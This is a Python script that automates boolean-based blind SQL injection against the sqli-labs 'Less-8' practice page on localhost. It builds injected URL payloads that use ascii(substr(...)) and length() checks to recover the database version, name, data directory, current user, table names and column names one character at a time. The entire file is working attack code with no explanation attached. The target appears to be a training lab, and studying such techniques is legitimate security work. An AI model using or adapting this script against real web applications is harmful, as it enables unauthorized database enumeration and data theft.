import requests
import re



def get_requester(payload):
    response_text = requests.get(payload)
    return response_text



def text_formatter(response_text):
    response_formatted_text = re.sub(r"[\n\t\s]*", "", response_text.text)
    return response_formatted_text



def database_name_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[87] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_text = get_requester(payload_1)
        response_formatted_text = text_formatter(response_text)

        if (validator == response_formatted_text[505:513]):
            response = True
            database_name_length = i
        else:
            response = False
            i = i + 1;
    return database_name_length



def database_name_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_database_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(database())) = 1 --+"

    database_name_length = database_name_length_finder(payload_database_length, validator)
    print(database_name_length)

    while (i < database_name_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[91] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[100] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)
            else:
                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)

            if (validator == response_formatted_text_1[505:513]):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[100] = str(a)
                payload_1 = "".join(list_payload_2)

    database_name = "".join(database_name_list)

    return database_name



def username_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[83] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_text = get_requester(payload_1)
        response_formatted_text = text_formatter(response_text)

        if (validator == response_formatted_text[505:513]):
            response = True
            username_length = i
        else:
            response = False
            i = i + 1;

    return username_length



def username_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_username_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(user())) = 0 --+"

    username_length = username_length_finder(payload_username_length, validator)
    print(username_length)

    while (i < username_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[87] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[96] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)
            else:
                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)

            if (validator == response_formatted_text_1[505:513]):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[96] = str(a)
                payload_1 = "".join(list_payload_2)

    username = "".join(database_name_list)

    return username



def datadir_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[86] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_text = get_requester(payload_1)
        response_formatted_text = text_formatter(response_text)

        if (validator == response_formatted_text[505:513]):
            response = True
            datadir_length = i
        else:
            response = False
            i = i + 1;

    return datadir_length



def datadir_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_datadir_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(@@datadir)) = 0 --+"

    datadir_length = datadir_length_finder(payload_datadir_length, validator)
    print(datadir_length)

    while (i < datadir_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[90] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[99] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)
            else:
                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)

            if (validator == response_formatted_text_1[505:513]):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[99] = str(a)
                payload_1 = "".join(list_payload_2)

    datadir_name = "".join(database_name_list)

    return datadir_name



def version_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[86] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_text = get_requester(payload_1)
        response_formatted_text = text_formatter(response_text)

        if (validator == response_formatted_text[505:513]):
            response = True
            version_length = i
        else:
            response = False
            i = i + 1;

    return version_length



def version_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_version_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(version())) = 1 --+"

    version_length = version_length_finder(payload_version_length, validator)
    print(version_length)

    while (i < version_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[90] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[99] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)
            else:
                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)

            if (validator == response_formatted_text_1[505:513]):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[99] = str(a)
                payload_1 = "".join(list_payload_2)

    version_name = "".join(database_name_list)

    return version_name



def tablename_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[162] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_text = get_requester(payload_1)
        response_formatted_text = text_formatter(response_text)

        if (validator == response_formatted_text[505:513]):
            response = True
            tablename_length = i
        else:
            response = False
            i = i + 1;

    return tablename_length



def tablename_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_tablename_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(group_concat(table_name)) from information_schema.tables where table_schema=database()) = 0 --+"

    tablename_length = tablename_length_finder(payload_tablename_length, validator)
    print(tablename_length)

    while (i < tablename_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[166] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[175] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)
            else:
                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)

            if (validator == response_formatted_text_1[505:513]):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[175] = str(a)
                payload_1 = "".join(list_payload_2)

    table_name = "".join(database_name_list)

    return table_name



def columnname_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[159] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_text = get_requester(payload_1)
        response_formatted_text = text_formatter(response_text)

        if (validator == response_formatted_text[505:513]):
            response = True
            columnname_length = i
        else:
            response = False
            i = i + 1;

    return columnname_length



def columnname_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_columnname_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(group_concat(column_name)) from information_schema.columns where table_name='users') = 0 --+"

    columnname_length = columnname_length_finder(payload_columnname_length, validator)
    print(columnname_length)

    while (i < columnname_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[163] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[172] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)
            else:
                print(payload_1)
                response_text_1 = get_requester(payload_1)
                response_formatted_text_1 = text_formatter(response_text_1)

            if (validator == response_formatted_text_1[505:513]):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[172] = str(a)
                payload_1 = "".join(list_payload_2)

    column_name = "".join(database_name_list)

    return column_name



def sql_injector():
    validator = 'Youarein'
    payload_version = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (ascii(substr((select version()),1,1))) = 0 --+"
    payload_database = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 0 --+"
    payload_datadir = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (ascii(substr((select @@datadir),1,1))) = 0 --+"
    payload_username = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (ascii(substr((select user()),1,1))) = 0 --+"
    payload_tablename = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))) = 0 --+"
    payload_columnname = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1))) = 0 --+"

    version_name = version_finder(payload_version, validator)
    database_name = database_name_finder(payload_database, validator)
    datadir_name = datadir_finder(payload_datadir, validator)
    user_name = username_finder(payload_username, validator)
    table_name = tablename_finder(payload_tablename, validator)
    column_name = columnname_finder(payload_columnname, validator)

    print("\n")
    print("Version: " + version_name)
    print("\n")
    print("Database_Name: " + database_name)
    print("\n")
    print("Data_directory: " + datadir_name)
    print("\n")
    print("Username: " + user_name)
    print("\n")
    print("Tables_in_Database: " + table_name)
    print("\n")
    print("Columns_in_Database: " + column_name)



sql_injector()
